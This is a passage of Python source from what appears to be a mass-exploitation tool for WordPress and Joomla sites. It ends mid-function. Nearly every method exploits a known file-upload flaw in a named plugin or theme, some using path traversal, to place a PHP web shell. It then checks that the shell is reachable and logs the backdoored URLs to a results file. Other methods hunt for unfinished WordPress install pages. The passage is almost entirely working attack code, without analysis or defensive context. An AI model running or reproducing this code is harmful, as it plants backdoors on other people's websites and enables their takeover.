			data = {'files[]':open (php, 'rb')}
			p = (url+'/wp-content/plugins/formcraft/file-upload/server/php/upload.php')
			c = (url+'/wp-content/plugins/formcraft/file-upload/server/php/files/Uploader_By_Cloud7_Agath.php')
			formpost = requests.post(p, headers=headers, files=data)
			formget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in formget.content:
				print('[WordPress] {}{}{} ||{}Formcraft{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Formcraft{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass



	def wpshop(self, url):
		# satu
		

		try:

			data = {'wpshop_file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload')
			c = (url+'/wp-content/uploads/Uploader_By_Cloud7_Agath.php')
			wpshoppost = requests.post(p, headers=headers, files=data)
			wpshopget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in wpshopget.content:
				print('[WordPress] {}{}{} ||{}Formcraft{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Formcraft{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def pitchprint(self, url):
		# satu 
		

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/wp-content/plugins/pitchprint/uploader/')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			pipost = requests.post(p, headers=headers, files=data)
			piget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in piget.content:
				print('[WordPress] {}{}{} ||{}Pitchprint{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Pitchprint{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def sexy(self, url):
		# satu

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php')
			c = (url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/Uploader_By_Cloud7_Agath.php')
			sexpost = requests.post(p, headers=headers, files=data)
			sexget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in sexget.content:
				print('[WordPress] {}{}{} ||{}Sexy Contact Form{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Sexy Contact Form{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def barclaycart(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/barclaycart/uploadify/uploadify.php')
			c = (url+'/wp-content/plugins/barclaycart/uploadify/Uploader_By_Cloud7_Agath.php')
			barpost = requests.post(p, headers=headers, files=data)
			barget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in barget.content:
				print('[WordPress] {}{}{} ||{}Barclaycart{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Barclaycart{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def reflexgal(self, url):
		# satu 

		try:

			data = {'qqfile':open (php, 'rb')}
			p = (url+'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year='+str(x.year)+'&Month='+str(x.month))
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			refpost = requests.post(p, headers=headers, files=data)
			refget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in refget.content:
				print('[WordPress] {}{}{} ||{}Reflex Gallery{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Reflex Gallery{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def snetworking(self, url):
		# satu

		try:

			payload = {'config_path':'../../../../../../'}
			data = {'image':open (phpjpg, 'rb')}
			p = (url+'/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php')
			c = (url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/Uploader_By_Cloud7_Agath.php.jpg')
			snetpost = requests.post(p, headers=headers, data=payload, files=data)
			snetget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in snetget.content:
				print('[WordPress] {}{}{} ||{}Social Networking{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Social Networking{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def revslider(self, url):
		# satu

		try:

			payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
			data = {'update_file':open (zipp, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/plugins/revslider/temp/update_extract/Uploader_By_Cloud7_Agath.php')
			revpost = requests.post(p, headers=headers, data=payload, files=data)
			revget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in revget.content:
				print('[WordPress] {}{}{} ||{}Revslider{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Revslider{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def woocommerup(self, url):
		# satu

		try:

			data = {'uploadfile':open (shell_r, 'rb')}
			p = (url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/upload.php')
			c = (url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/uploadImage/'+tok[0]+'.php')
			wopost = requests.post(p, headers=headers, data={'value': './'}, files=data)
			tok = re.findall('(.*?).php', wopost.text)
			woget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in woget.content:
				print('[WordPress] {}{}{} ||{}Woocommerce{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Woocommerce{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass




	def stnews(self, url):
		# satu

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/st_newsletter/visual_editors/fckeditor/editor/filemanager/upload/test.html')
			c = (url+'/wp-content/uploads/Uploader_By_Cloud7_Agath.php')
			stpost = requests.post(p, headers=headers, files=data)
			stget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in stget.content:
				print('[WordPress] {}{}{} ||{}St Newsletter{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}St Newsletter{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def phpevent(self, url):
		# satu

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/php-event-calendar/server/file-uploader/')
			c = (url+'/wp-content/plugins/php-event-calendar/server/file-uploader/Uploader_By_Cloud7_Agath.php')
			phpost = requests.post(p, headers=headers, files=data)
			phget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in phget.content:
				print('[WordPress] {}{}{} ||{}Php Event{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Php Event{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def blaze(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-admin/admin.php?page=blaze_manage')
			c = (url+'/wp-content/uploads/blaze/uploadfolder/big/Uploader_By_Cloud7_Agath.php')
			blapost = requests.post(p, headers=headers, files=data)
			blaget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in blaget.content:
				print('[WordPress] {}{}{} ||{}Blaze{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Blaze{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def symposium(self, url):
		# satu

		try:

			data = {'fileToUpload':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wp-symposium/js/uploadify/uploadify.php')
			c = (url+'/wp-content/uploads/Uploader_By_Cloud7_Agath.php')
			sympost = requests.post(p, headers=headers, files=data)
			symget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in symget.content:
				print('[WordPress] {}{}{} ||{}Symposium{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Symposium{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def copysafe(self, url):
		# satu

		try:

			payload = {'upload_path': '../../../../uploads/'}
			data = {'wpcsp_file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php')
			c = (url+'/wp-content/uploads/Uploader_By_Cloud7_Agath.php')
			coppost = requests.post(p, headers=headers, data=payload, files=data)
			copget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in copget.content:
				print('[WordPress] {}{}{} ||{}Wp Copysafe{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Wp Copysafe{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def wpuserf(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php?action=wpuf_file_upload')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			wpupost = requests.post(p, headers=headers, files=data)
			wpuget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in wpuget.content:
				print('[WordPress] {}{}{} ||{}Wp Userfrontend{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Wp Userfrontend{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def mobilef(self, url):
		# satu 

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/server/images.php')
			c = (url+'/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/Uploader_By_Cloud7_Agath.php')
			mobpost = requests.post(p, headers=headers, files=data)
			mobget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in mobget.content:
				print('[WordPress] {}{}{} ||{}Mobile Friendly{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Mobile Friendly{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def viralop(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/viral-optins/api/uploader/file-uploader.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			virpost = requests.post(p, headers=headers, files=data)
			virget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in virget.content:
				print('[WordPress] {}{}{} ||{}Viral Optins{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Viral Optins{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def secfiles(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/omni-secure-files/plupload/examples/upload.php')
			c = (url+'/wp-content/plugins/omni-secure-files/plupload/examples/uploads/Uploader_By_Cloud7_Agath.php')
			secpost = requests.post(p, headers=headers, files=data)
			secget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in secget.content:
				print('[WordPress] {}{}{} ||{}Omni Secure Files{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Omni Secure Files{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass



	def checkout(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wp-checkout/vendors/uploadify/upload.php')
			c = (url+'/wp-content/uploads/wp-checkout/uploadify/Uploader_By_Cloud7_Agath.php')
			chepost = requests.post(p, headers=headers, files=data)
			cheget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in cheget.content:
				print('[WordPress] {}{}{} ||{}Wp Checkout{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Wp Checkout{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass



	def purevision(self, url):
		# satu 

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			purpost = requests.post(p, headers=headers, files=data)
			purget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in purget.content:
				print('[WordPress] {}{}{} ||{}Purevision{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Purevision{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))



		except:
			pass



	def multimedia(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/multimedia1/server/php/')
			c = (url+'/wp-content/themes/multimedia1/server/php/files/Uploader_By_Cloud7_Agath.php')
			mulpost = requests.post(p, headers=headers, files=data)
			mulget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in mulget.content:
				print('[WordPress] {}{}{} ||{}Multimedia{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Multimedia{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass



	def inmarketing(self, url):
		# satu

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php')
			c = (url+'/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/Uploader_By_Cloud7_Agath.php')
			inmpost = requests.post(p, headers=headers, files=data)
			inmget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in inmget.content:
				print('[WordPress] {}{}{} ||{}Inboundio Marketing{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Inboundio Marketing{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def fileupload(self, url):
		# satu 

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-admin/options-general.php?page=wordpress_file_upload&action=edit_settings')
			c = (url+'/wp-admin/Uploader_By_Cloud7_Agath.php')
			filepost = requests.post(p, headers=headers, files=data)
			fileget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in fileget.content:
				print('[WordPress] {}{}{} ||{}File Upload{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}File Upload{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def logosware(self, url):
		# satu 

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/logosware-suite-uploader/lw-suite-uploader.php')
			c = (url+'/wp-content/plugins/logosware-suite-uploader/Uploader_By_Cloud7_Agath.php')
			logpost = requests.post(p, headers=headers, files=data)
			logget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in logget.content:
				print('[WordPress] {}{}{} ||{}Logosware Suite Uploader{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Logosware Suite Uploader{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def dzszsound(self, url):
		# satu

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/dzs-zoomsounds/admin/upload.php')
			c = (url+'/wp-content/plugins/dzs-zoomsounds/admin/upload/Uploader_By_Cloud7_Agath.php')
			dzspost = requests.post(p, headers=headers, files=data)
			dzsget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in dzsget.content:
				print('[WordPress] {}{}{} ||{}Dzs Zoomsounds{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Dzs Zoomsounds{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def iphone(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/i-dump-iphone-to-wordpress-photo-uploader/uploader.php')
			c = (url+'/wp-content/uploads/i-dump-uploads/Uploader_By_Cloud7_Agath.php')
			iphpost = requests.post(p, headers=headers, files=data)
			iphget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in iphget.content:
				print('[WordPress] {}{}{} ||{}I Dump Iphone To Wordpress{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}I Dump Iphone To Wordpress{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))



		except:
			pass



	def levoslide(self, url):
		# satu

		try:

			data = {'Filedata':open (phpjpg, 'rb')}
			p = (url+'/wp-admin/admin.php?page=levoslideshow_manage')
			c = (url+'/wp-content/uploads/levoslideshow/42_uploadfolder/big/Uploader_By_Cloud7_Agath.php.jpg')
			levpost = requests.post(p, headers=headers, files=data)
			levget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in levget.content:
				print('[WordPress] {}{}{} ||{}Levoslideshow{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Levoslideshow{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))



		except:
			pass



	def jssorup(self, url):
		# one

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library')
			c = (url+'/wp-content/jssor-slider/jssor-uploads/Uploader_By_Cloud7_Agath.php')
			jspost = requests.post(p, headers=headers, files=data)
			jsget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in jsget.content:
				print('[WordPress] {}{}{} ||{}Jssor Uploads{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Jssor Uploads{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def wysija(self, url):
		# one

		try:

			data = {'my-theme':open (zipp, 'rb')}
			payload = {'action':'themeupload',
						'submitter':'Upload',
						'overwriteexistingtheme':'on',
						'page':'GZNeFLoZAb'}
			p = (url+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes')
			c = (url+'/wp-content/uploads/wysija/themes/revslider/Uploader_By_Cloud7_Agath.php')
			wypost = requests.post(p, headers=headers, data=payload, files=data)
			wyget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in wyget.content:
				print('[WordPress] {}{}{} ||{}Wysija{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Wysija{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	

	def lineexplo(self, url):
		# one

		try:

			shell = {'file':open (php, 'rb')}
			payload = {'settins_upload': 'settings', 'page': 'pagelines'}
			p = (url+'/wp-admin/admin-post.php')
			c = (url+'/wp-content/Uploader_By_Cloud7_Agath.php')
			linpost = requests.post(p, files=shell, data=payload, headers=headers, timeout=5)
			linget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in linget.content:
				print('[WordPress] {}{}{} ||{}Page Line{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Page Line{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))



		except:
			pass


	def addblocker(self, url):
		# one

		try:

			data = {'popimg':open (php, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php?action=getcountryuser&cs=2')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			addpost = requests.post(p, files=data, headers=headers, timeout=5)
			addget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in addget.content:
				print('[WordPress] {}{}{} ||{}Add Block Blocker{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Add Block Blocker{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))



		except:
			pass


	def pageline(self, url):
		# one

		try:

			post = {'Settings2_upload': 'Settings2', 'page': 'pagelines'}
			shell = {'file':open (php, 'rb')}
			p = (url+'/wp-admin/admin-post.php')
			c = (url+'/wp-content/Uploader_By_Cloud7_Agath.php')
			pagepost = requests.post(p, data=post, files=shell, headers=headers)
			pageget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in pageget.content:
				print('[WordPress] {}{}{} ||{}Page Lines 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Page Lines 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))



		except:
			pass



	def gravity(self, url):
		# one

		try:

			post = {'field_id':'3',
					'form_id':'1',
					'gfrom_unique_id':'../../../../',
					'name':'Uploader_By_Cloud7_Agath.phtml'}
			shell = {'file':open (phtml, 'rb')}
			p = (url+'/?gf_page=upload')
			c = (url+'/wp-content/_input_3_Uploader_By_Cloud7_Agath.phtml')
			gravpost = requests.post(p, headers=headers, data=post, files=shell)
			garvget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in garvget.content:
				print('[WordPress] {}{}{} ||{}Gravity{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Gravity{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))



		except:
			pass


	def mail(self, url):
		# one 

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wp-mailinglist/vendors/uploadify/upload.php')
			c = (url+'/wp-content/uploads/wp-mailinglist/Uploader_By_Cloud7_Agath.php')
			mailpost = requests.post(p, headers=headers, files=data)
			mailget = requests.get(c, headers=headers)

			if 'Uploader_By_Cloud7_Agath_' in mailget.content:
				print('[WordPress] {}{}{} ||{}Mailinglist{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Mailinglist{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	
	def ajaxform(self, url):
		# one

		try:
			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/do.upload.php?form_id=afp')
			c = (url+"/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/uploads/Uploader_By_Cloud7_Agath.php")
			ajpost = requests.post(p, headers=headers, files=data)
			ajget = requests.get(c, headers=headers)
			if 'Uploader_By_Cloud7_Agath_' in ajget.content:
				print('[WordPress] {}{}{} ||{}Ajax Form Pro{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Ajax Form Pro{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass


	def wpinstall(self, url):
		# one

		try:

			path = ['/wp', '/wordpress', '/blog']
			for dirc in path:
				get = requests.get(url + dirc + '/wp-admin/setup-config.php', headers=headers, timeout=10)
				if '<a href="setup-config.php?step=1' in get.content:
					print('[WordPress] {}{}{} ||{}Wp Install{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('R3zlt/WordPress_Install.txt', 'a').write(url+dirc+'\n')
				else:
					print('[WordPress] {}{}{} ||{}Wp Install{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def wpinstall2(self, url):
		# last 

		try:

			get = requests.get(url+'/wp-admin/setup-config.php', headers=headers)
			if 'Setup Configuration File' in get.content:
				print('[WordPress] {}{}{} ||{}Wp Install 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('R3zlt/WordPress_Install.txt', 'a').write(url+'/wp-admin/setup-config.php'+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Wp Install 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass


Namiii = str(time.time())[:-3]
shellname = 'Uploader_By_Cloud7_Agath'+str(Namiii)+'.php'

class J00mla:
	def b2jjoom(self, url):
		try:
			data = {'file':open (php, 'rb')}
			p = (url+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../')
			c = (url+'/components/com_b2jcontact/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_B2j{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_B2j{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def b2j2joom(self, url):
		try:
			p = (url+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../'+shellname)
			c = (url+'/components/'+shellname)
			asd = requests.post(p, headers=headers, data=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_B2j 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_B2j 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass




	def fabrikjoom(self, url):
		try:
			pay = {'name' : 'me.php',
			'drop_data' : '1',
			'overwrite': '1',
			'field_delimiter': ',',
			'text_delimiter' : '&quot;',
			'option' : 'com_fabrick',
			'controller' : 'import',
			'view' : 'import',
			'task' : 'doimport',
			'Itemid' : '0',
			'tableid' : '0'}
			pay2 = {'userfile':open (php, 'rb')}
			p = (url+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1')
